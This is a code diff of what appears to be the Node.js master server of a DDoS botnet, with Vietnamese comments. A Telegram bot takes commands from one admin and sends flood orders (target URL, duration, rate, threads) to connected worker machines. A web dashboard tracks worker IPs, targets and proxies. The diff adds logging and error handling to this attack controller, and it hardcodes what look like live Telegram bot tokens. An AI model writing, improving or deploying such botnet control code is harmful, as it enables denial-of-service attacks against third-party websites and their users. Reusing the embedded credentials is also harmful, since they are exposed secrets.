@@ -13,8 +13,8 @@ const axios = require('axios');
 
 // ==================== CONFIG ====================
 const PORT = process.env.PORT || 10000;
-const BOT_TOKEN = '8317101752:AAG0OxVpnew7KH1ncf3xZQ_FX4Cln6CvKPM';
-const ADMIN_ID = '8344034544';
+const BOT_TOKEN = '8317101752:AAEphN_qXBLlMnD5Rg2oyZ1F3TnUYAeFw9E'; // Token bot Telegram của bạn
+const ADMIN_ID = '8344034544'; // ID Telegram của bạn
 
 // ==================== KIỂM TRA CONFIG ====================
 if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
@@ -48,12 +48,36 @@ let currentAttack = null;
 let totalRequests = 0;
 let attackStartTime = null;
 
-// ==================== TELEGRAM BOT ====================
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+// ==================== TELEGRAM BOT - FIX CONFLICT ====================
+let bot;
+try {
+    // Tắt polling cũ nếu có
+    bot = new TelegramBot(BOT_TOKEN, { 
+        polling: {
+            interval: 300,
+            autoStart: true,
+            params: {
+                timeout: 10
+            }
+        }
+    });
+    
+    console.log('[+] Telegram bot initialized');
+} catch (error) {
+    console.error('[!] Telegram bot init error:', error.message);
+    process.exit(1);
+}
+
+// Xử lý lỗi polling
+bot.on('polling_error', (error) => {
+    console.error('[!] Polling error:', error.message);
+});
 
 // Command /start
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id.toString();
+    console.log(`[Telegram] /start from ${chatId}`);
+    
     if (chatId !== ADMIN_ID) {
         return bot.sendMessage(chatId, '❌ Bạn không có quyền sử dụng bot này!');
     }
@@ -61,8 +85,8 @@ bot.onText(/\/start/, (msg) => {
     bot.sendMessage(chatId, `
 🔥 **BOTNET MASTER READY**
 
-📡 Workers: ${workers.size}
-🎯 Status: ${currentAttack ? 'ATTACKING' : 'IDLE'}
+📡 **Workers:** ${workers.size}
+🎯 **Status:** ${currentAttack ? 'ATTACKING' : 'IDLE'}
 
 📚 **COMMANDS:**
 /workers - Xem danh sách worker
@@ -98,23 +122,27 @@ bot.onText(/\/help/, (msg) => {
     `, { parse_mode: 'Markdown' });
 });
 
-// Command /workers
+// Command /workers - FIX: Hiển thị worker dù idle hay attacking
 bot.onText(/\/workers/, (msg) => {
     const chatId = msg.chat.id.toString();
     if (chatId !== ADMIN_ID) return;
+    
+    console.log(`[Telegram] /workers - Current workers: ${workers.size}`);
     
     if (workers.size === 0) {
         return bot.sendMessage(chatId, '❌ Không có worker nào đang kết nối!');
     }
     
     let message = `📡 **WORKERS (${workers.size}):**\n\n`;
+    let count = 1;
+    
     workers.forEach((worker, id) => {
         const statusEmoji = worker.status === 'attacking' ? '🔥' : '💤';
-        const targetInfo = worker.target ? `🎯 ${worker.target}` : '';
+        const targetInfo = worker.target ? `🎯 \`${worker.target}\`` : '';
         const proxyInfo = worker.info?.proxies ? `📦 ${worker.info.proxies} proxies` : '';
         const lastSeen = Math.floor((Date.now() - worker.lastSeen) / 1000);
         
-        message += `${statusEmoji} \`${worker.ip}\`\n`;
+        message += `${count++}. ${statusEmoji} \`${worker.ip}\`\n`;
         message += `   Status: ${worker.status}\n`;
         if (targetInfo) message += `   ${targetInfo}\n`;
         if (proxyInfo) message += `   ${proxyInfo}\n`;
@@ -156,12 +184,17 @@ bot.onText(/\/attack (.+)/, async (msg, match) => {
         return bot.sendMessage(chatId, '❌ Threads phải >= 1');
     }
     
+    // FIX: Kiểm tra worker và log
+    console.log(`[Attack] Workers available: ${workers.size}`);
+    console.log(`[Attack] Workers list:`, Array.from(workers.values()).map(w => w.ip));
+    
     if (workers.size === 0) {
         return bot.sendMessage(chatId, '❌ Không có worker nào để tấn công!');
     }
     
     // Dừng attack cũ nếu có
     if (currentAttack) {
+        console.log('[Attack] Stopping previous attack');
         io.emit('stop');
         currentAttack = null;
     }
@@ -174,11 +207,16 @@ bot.onText(/\/attack (.+)/, async (msg, match) => {
     // Gửi lệnh cho tất cả worker
     let sentCount = 0;
     workers.forEach((worker, id) => {
+        console.log(`[Attack] Sending to worker ${worker.ip}, status: ${worker.status}, connected: ${worker.socket?.connected}`);
+        
         if (worker.status === 'idle' && worker.socket && worker.socket.connected) {
             worker.socket.emit('attack', currentAttack);
             worker.status = 'attacking';
             worker.target = target;
             sentCount++;
+            console.log(`[Attack] Sent to ${worker.ip}`);
+        } else {
+            console.log(`[Attack] Cannot send to ${worker.ip} - status: ${worker.status}, connected: ${worker.socket?.connected}`);
         }
     });
     
@@ -194,6 +232,7 @@ bot.onText(/\/attack (.+)/, async (msg, match) => {
     // Tự động kết thúc sau thời gian
     setTimeout(() => {
         if (currentAttack) {
+            console.log('[Attack] Time finished, stopping...');
             io.emit('stop');
             
             workers.forEach(worker => {
@@ -223,6 +262,7 @@ bot.onText(/\/stop/, (msg) => {
     if (chatId !== ADMIN_ID) return;
     
     if (currentAttack) {
+        console.log('[Stop] Stopping attack');
         io.emit('stop');
         
         workers.forEach(worker => {
@@ -292,6 +332,8 @@ app.get('/', (req, res) => {
                 table { width: 100%; border-collapse: collapse; }
                 th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; }
                 th { color: #00ff00; }
+                .online { color: #00ff00; }
+                .offline { color: #ff4444; }
             </style>
             <meta http-equiv="refresh" content="5">
         </head>
@@ -304,28 +346,43 @@ app.get('/', (req, res) => {
                     <p><span class="label">Workers:</span> <span class="stat">${workers.size}</span></p>
                     <p><span class="label">Status:</span> <span class="stat ${attacking > 0 ? 'attacking' : ''}">${attacking > 0 ? '🔥 ATTACKING' : '💤 IDLE'}</span></p>
                     <p><span class="label">Total Requests:</span> <span class="stat">${totalRequests.toLocaleString()}</span></p>
+                    <p><span class="label">Port:</span> <span class="stat">${PORT}</span></p>
                 </div>
                 
                 <div class="card">
-                    <h2>Workers List</h2>
+                    <h2>Workers List (${workers.size})</h2>
                     <table>
                         <tr>
+                            <th>#</th>
                             <th>IP</th>
                             <th>Status</th>
                             <th>Target</th>
                             <th>Proxies</th>
                             <th>Last Seen</th>
+                            <th>Socket</th>
                         </tr>
-                        ${Array.from(workers.values()).map(w => `
+                        ${Array.from(workers.entries()).map(([id, w], index) => `
                         <tr>
+                            <td>${index + 1}</td>
                             <td>${w.ip}</td>
                             <td class="${w.status === 'attacking' ? 'attacking' : ''}">${w.status}</td>
                             <td>${w.target || '-'}</td>
                             <td>${w.info?.proxies || 0}</td>
                             <td>${Math.floor((Date.now() - w.lastSeen) / 1000)}s</td>
+                            <td class="${w.socket?.connected ? 'online' : 'offline'}">${w.socket?.connected ? '✅' : '❌'}</td>
                         </tr>
                         `).join('')}
-                        ${workers.size === 0 ? '<tr><td colspan="5" style="text-align:center">No workers connected</td></tr>' : ''}
+                        ${workers.size === 0 ? '<tr><td colspan="7" style="text-align:center">No workers connected</td></tr>' : ''}
+                    </table>
+                </div>
+                
+                <div class="card">
+                    <h2>Telegram Commands</h2>
+                    <table>
+                        <tr><td><code>/workers</code></td><td>- Xem worker</td></tr>
+                        <tr><td><code>/attack url time rate threads</code></td><td>- Tấn công</td></tr>
+                        <tr><td><code>/stop</code></td><td>- Dừng</td></tr>
+                        <tr><td><code>/status</code></td><td>- Trạng thái</td></tr>
                     </table>
                 </div>
             </div>
@@ -339,6 +396,13 @@ app.get('/health', (req, res) => {
         status: 'ok',
         workers: workers.size,
         attacking: Array.from(workers.values()).filter(w => w.status === 'attacking').length,
+        workersList: Array.from(workers.values()).map(w => ({
+            ip: w.ip,
+            status: w.status,
+            target: w.target,
+            connected: w.socket?.connected || false,
+            lastSeen: w.lastSeen
+        })),
         uptime: process.uptime()
     });
 });
@@ -367,11 +431,13 @@ io.on('connection', (socket) => {
         console.log(`[+] Worker registered: ${workerIp} (Total: ${workers.size})`);
         
         // Gửi thông báo Telegram
-        const chatId = ADMIN_ID;
-        bot.sendMessage(chatId, `✅ Worker connected: \`${workerIp}\`\n📡 Total workers: ${workers.size}`, { parse_mode: 'Markdown' });
+        try {
+            bot.sendMessage(ADMIN_ID, `✅ **Worker Connected**\nIP: \`${workerIp}\`\nTotal: ${workers.size}`, { parse_mode: 'Markdown' });
+        } catch (e) {}
 
         // Nếu đang có attack, gửi lệnh cho worker mới
         if (currentAttack) {
+            console.log(`[+] Sending ongoing attack to new worker: ${workerIp}`);
             socket.emit('attack', currentAttack);
             workers.get(socket.id).status = 'attacking';
             workers.get(socket.id).target = currentAttack.target;
@@ -405,8 +471,9 @@ io.on('connection', (socket) => {
             console.log(`[-] Worker disconnected: ${worker.ip} - Reason: ${reason}`);
             
             // Gửi thông báo Telegram
-            const chatId = ADMIN_ID;
-            bot.sendMessage(chatId, `❌ Worker disconnected: \`${worker.ip}\`\n📡 Workers left: ${workers.size - 1}`, { parse_mode: 'Markdown' });
+            try {
+                bot.sendMessage(ADMIN_ID, `❌ **Worker Disconnected**\nIP: \`${worker.ip}\`\nReason: ${reason}\nLeft: ${workers.size - 1}`, { parse_mode: 'Markdown' });
+            } catch (e) {}
             
             workers.delete(socket.id);
         }
@@ -441,4 +508,5 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`[+] Master server running on port ${PORT}`);
     console.log(`[+] Web dashboard: http://localhost:${PORT}`);
     console.log(`[+] Telegram bot started!`);
+    console.log(`[+] ADMIN_ID: ${ADMIN_ID}`);
 });
